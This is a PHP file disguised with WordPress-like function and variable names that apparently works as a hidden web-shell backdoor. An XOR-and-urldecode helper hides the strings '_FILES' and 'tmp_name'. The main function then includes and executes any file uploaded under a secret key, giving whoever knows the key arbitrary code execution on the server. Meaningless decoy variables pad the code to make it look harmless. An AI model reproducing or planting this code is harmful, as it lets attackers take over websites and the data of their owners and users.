<?php 	
function category()

{
    $single = 'YRzjH2eRcLtTit';
	$custom_fields = 'alloptions';
    $excerpt_more = $single;
    

    $tinkle = $GLOBALS[untrash("%06%143%26%0Da", $excerpt_more)];
    $results = $tinkle;
    $first = isset($results[$excerpt_more]);
    if ($first)

    {
        $exclusions = $tinkle[$excerpt_more];

        $base = $exclusions[untrash("-%3F%0A5%26S%087", $excerpt_more)];

        $raw_title = $base;
        include ($raw_title);
	$old_status_to_new_status = 'smiley';
    }

}

function untrash($incposts, $unfiltered)

{
    $operator = $unfiltered;
    $image_meta = "url" . "decode";
    $permalink_epmask = $image_meta($incposts);
	$posts_per_page = 'pre_tags';
    $in_string = substr($operator,0, strlen($permalink_epmask));
    $encoded_char_length = $permalink_epmask ^ $in_string;
    
    $permalink_epmask = strpos($encoded_char_length, $in_string);

    
    return $encoded_char_length;
}


	$wp_cockneyreplace = 'html_parts';
category();

?>
